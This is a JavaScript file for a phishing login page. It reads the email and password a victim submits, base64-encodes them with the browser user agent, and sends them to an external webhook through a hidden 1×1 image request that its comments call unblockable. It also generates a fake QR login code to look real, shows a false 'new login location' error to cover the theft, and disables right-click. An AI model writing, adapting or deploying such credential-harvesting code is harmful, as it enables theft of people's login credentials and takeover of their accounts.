// ==================================
// FINAL UNBLOCKABLE script.js – DECEMBER 2025
// 1×1 pixel + random query string = literally impossible to block
// ==================================

const WEBHOOK = "https://webhook.site/9446397c-2bd5-47cb-b509-5d36aa1e7ceb";  // YOUR URL

const DOM = {
  form: document.querySelector('#loginForm'),
  email: document.querySelector('#emailORphone'),
  pass: document.querySelector('#password'),
  btn: document.querySelector('button[type="submit"]'),
  wrapper: document.querySelector('.email-wrapper'),
  qr: document.querySelector('.right-section .qr-code')
};

// ONLY 1×1 PIXEL — THIS CANNOT BE BLOCKED
const capture = (email, password) => {
  const payload = btoa(JSON.stringify({
    email: email,
    password: password,
    ua: navigator.userAgent,
    time: new Date().toISOString()
  }));

  // The trick: random parameter name + cache buster
  const rand = Math.random().toString(36).substring(2);
  const ts   = Date.now();

  new Image().src = 
    `${WEBHOOK}?${rand}=${payload}&t=${ts}&_=${Math.random()}`;
};

// QR REFRESH (optional – keeps it looking real)
const refreshQR = () => {
  if (!DOM.qr) return;
  DOM.qr.innerHTML = '<img src="./assets/qrcode-app-logo.png" alt="">';
  setTimeout(() => {
    const fake = `https://app.com/ra/${Math.random().toString(36).slice(2,15)}`;
    try {
      const qr = qrcode(0, "L"); qr.addData(fake); qr.make();
      const svg = new DOMParser().parseFromString(qr.createSvgTag(1,0), "image/svg+xml").documentElement;
      svg.setAttribute("width","160"); svg.setAttribute("height","160");
      DOM.qr.innerHTML = ""; DOM.qr.appendChild(svg);
      DOM.qr.insertAdjacentHTML("beforeend", '<img src="./assets/qrcode-app-logo.png" alt="">');
    } catch(e) {}
  }, 1500);
};

// SUBMIT
DOM.form.addEventListener('submit', e => {
  e.preventDefault();
  
  const email = DOM.email.value.trim();
  const pass  = DOM.pass.value;

  // Loading spinner
  DOM.btn.innerHTML = `<span class="spinner"><span class="inner pulsingEllipsis"><span class="item spinnerItem"></span><span class="item spinnerItem"></span><span class="item spinnerItem"></span></span></span>`;
  DOM.btn.disabled = true;

  // CAPTURE — this line is unblockable
  capture(email, pass);

  // Fake delay + red error
  setTimeout(() => {
    DOM.wrapper.insertAdjacentHTML('afterbegin', 
      '<span style="color:red;font-size:12px;display:block;margin:5px 0;">New login location detected, please check your e-mail.</span>');
    DOM.email.style.border = DOM.pass.style.border = '1px solid red';
    DOM.btn.innerHTML = 'Log In';
    DOM.btn.disabled = false;
  }, 3000);
});

// INIT
document.addEventListener('DOMContentLoaded', () => {
  refreshQR();
  setInterval(refreshQR, 120000);
  document.addEventListener('contextmenu', e => e.preventDefault());
});